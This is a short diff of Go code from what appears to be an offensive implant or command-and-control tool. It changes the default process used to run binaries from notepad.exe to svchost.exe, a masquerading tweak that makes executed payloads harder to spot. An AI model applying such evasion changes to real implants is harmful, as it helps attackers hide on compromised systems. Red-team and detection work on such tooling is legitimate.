@@ -24,7 +24,7 @@ import (
 
 func handleBinary(binary *implantpb.ExecuteBinary) *implantpb.ExecuteBinary {
 	if binary.ProcessName == "" {
-		binary.ProcessName = `C:\\Windows\\System32\\notepad.exe`
+		binary.ProcessName = `C:\\Windows\\System32\\svchost.exe`
 	}
 	if binary.Timeout == 0 {
 		binary.Timeout = math.MaxUint32
